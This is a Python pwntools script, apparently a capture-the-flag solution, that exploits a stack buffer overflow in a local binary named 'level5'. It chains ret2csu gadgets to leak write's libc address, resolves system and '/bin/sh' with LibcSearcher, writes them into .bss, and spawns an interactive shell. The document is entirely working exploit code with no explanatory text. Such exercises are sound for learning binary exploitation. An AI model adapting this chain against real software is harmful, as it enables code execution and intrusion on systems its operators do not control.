# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
#context.log_level="debug"

io = process('./level5')
elf = ELF('./level5')

write_got = p64(elf.got['write'])
start_addr = p64(elf.symbols['_start'])
gadget1_addr = p64(0x400606)
gadget2_addr = p64(0x4005F0)
payload = b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + write_got + p64(1) + write_got + p64(8) + gadget2_addr + b'a' * 56 + start_addr
io.recvuntil("Hello, World\n")
io.send(payload)
write_addr = u64(io.recv(8))
print('send 1')

libc = LibcSearcher("write",write_addr)
libcbase = write_addr - libc.dump("write")
sys_addr = libcbase + libc.dump("system")
bin_sh_addr = libcbase + libc.dump("str_bin_sh")

read_got = p64(elf.got['read'])
bss_addr = elf.bss()
payload2 = b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + read_got + p64(0) + p64(bss_addr) + p64(16) + gadget2_addr + b'a' * 56 + start_addr
io.recvuntil("Hello, World\n")
io.send(payload2)
io.send(p64(sys_addr) )
io.send("/bin/sh\n")
print('send 2')

payload3 =b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0) + gadget2_addr + b'a' * 56 + start_addr
io.recvuntil("Hello, World\n")
io.send(payload3)
print('send 3')

io.interactive()

